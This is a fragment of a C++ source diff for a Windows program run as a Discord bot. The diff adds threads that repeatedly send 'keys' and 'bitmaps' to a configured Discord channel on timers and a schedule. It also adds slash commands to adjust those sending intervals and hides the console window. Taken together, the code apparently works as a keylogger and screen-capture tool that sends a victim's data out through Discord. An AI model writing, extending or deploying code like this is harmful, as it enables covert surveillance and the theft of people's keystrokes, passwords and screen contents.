 		imagemsg = dpp::message(bot.get());
-		imagemsg.set_guild_id(COMMAND_LINE_OPTION::BOT_GUILD_ID);
-		imagemsg.set_channel_id(COMMAND_LINE_OPTION::BOT_CHANNEL_ID);
+		imagemsg.set_guild_id(COMMAND_LINE_OPTION.BOT_LOCATION[2]);
+		imagemsg.set_channel_id(COMMAND_LINE_OPTION.BOT_LOCATION[3]);
 		imagemsg.set_content("Image sent!");
 
         /* Register slash command here in on_ready */
         bot->on_ready([](const dpp::ready_t& event) {
             /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
             if (dpp::run_once<struct register_bot_commands>()) {
+				//Clear previous command, then register new one
+				// bot->global_commands_get([](const dpp::confirmation_callback_t &eventret) {
+				// 	dpp::slashcommand_map slashcmd_mapper = eventret.get<dpp::slashcommand_map>();
+				// 	for(auto& pp:slashcmd_mapper) {
+				// 		bot->global_command_delete(pp.first);
+				// 	}
+				// });
+
                 bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
 				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
+				bot->global_command_create(dpp::slashcommand("changehs", "change image hash factor", bot->me.id)
+								.add_option(dpp::command_option(dpp::co_integer, "val", "enter val", true)
+												.set_max_value(100ll).set_min_value(0ll)
+											));
+				bot->global_command_create(dpp::slashcommand("keytime", "change key sending interval", bot->me.id)
+								.add_option(dpp::command_option(dpp::co_integer, "val", "time in minutes", true)
+												.set_max_value(50ll).set_min_value(1ll)
+											));
+				bot->global_command_create(dpp::slashcommand("bitmaptime", "change bitmap sending interval", bot->me.id)
+								.add_option(dpp::command_option(dpp::co_integer, "val", "time in seconds", true)
+												.set_max_value(301ll).set_min_value(5ll)
+											));
             }
 
 			keymsg.set_content("Session initialized!");
@@ -671,21 +723,86 @@ void botrun()
 		bot_connected_condvar.notify_all();
     }
 
-	std::thread t3(send_data);
-	t3.join();
+	std::thread t3(send_bitmap);
+	t3.detach();
+
+	time_t tptr = time(NULL);
+    tm *ts = localtime(&tptr);
+    ts->tm_sec = 0;
+    ts->tm_min = 0;
+    ts->tm_hour = 0;
+
+    time_t tbase = mktime(ts);
+    tptr -= tbase;
+    
+    std::thread t4([&tptr, &tbase]{
+		size_t pos = std::upper_bound(SCHEDULE.begin(), SCHEDULE.end(), tptr)-SCHEDULE.begin();
+        for(; pos < SCHEDULE.size(); pos++) {
+            std::this_thread::sleep_until(
+				std::chrono::time_point
+					<std::chrono::system_clock, std::chrono::seconds>(
+						std::chrono::seconds(tbase+SCHEDULE[pos])
+					)
+				);
+            send_key(true);
+        }
+    });
+    t4.detach();
+
+	while(true) {
+		std::this_thread::sleep_for(std::chrono::minutes(COMMAND_LINE_OPTION.SEND_KEY_INTERVAL));
+		send_key();
+	}
 }
 
-bool cmdline_parse(int argc, WCHAR** argv) {
-	for(int i=1; i <= argc; i++) {
+const std::map<std::string, std::function<void(const std::vector<std::string>&)>> ARGUMENT_FUNC_MAP = {
+	{"c", [](const std::vector<std::string>& vec) {
+		COMMAND_LINE_OPTION.COMPRESSED_MODE = true;
+	}}, 
+	{"t", [](const std::vector<std::string>& vec) {
+		const int intended_size = 4;
+		for(int i=1; i < OURMIN(intended_size, (int) vec.size()); i++) {
+			COMMAND_LINE_OPTION.BOT_LOCATION[i] = vec[i];
+		}
+	}}
+};
 
+int cmdline_parse(int argc, WCHAR** argv) {	
+	for(int i=1; i < argc; i++) {
+		int wlen = wcslen(argv[i]);
+		if(wlen > 1000000) {	[[unlikely]] //too long!
+			return -1;
+		}
+
+		int len = wlen*2*sizeof(WCHAR);
+		char *str = (char*) malloc(len), *tok = NULL;
+		wide_char_to_mb(argv[i], str, len);
+
+		if(len > 0) {
+			if(str[0] == '-') {
+				std::vector<std::string> vec;
+				tok = strtok(str, "-:");
+				while(tok != NULL) {
+					vec.push_back(std::string(tok));
+					tok = strtok(NULL, "-:");
+				}
+
+				//simply skip unrecognized arguments
+				if(ARGUMENT_FUNC_MAP.find(vec[0]) != ARGUMENT_FUNC_MAP.end()) {
+					ARGUMENT_FUNC_MAP.at(vec[0])(vec);
+				}
+			} 
+		}
+
+		free(str);
 	}
-	return true;
+	return 0;
 }
 
 //now switch to windows subsystem, no longer console
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 	int argc;
-	WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);
+	WCHAR** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 	cmdline_parse(argc, argv);
 
 	preinit();
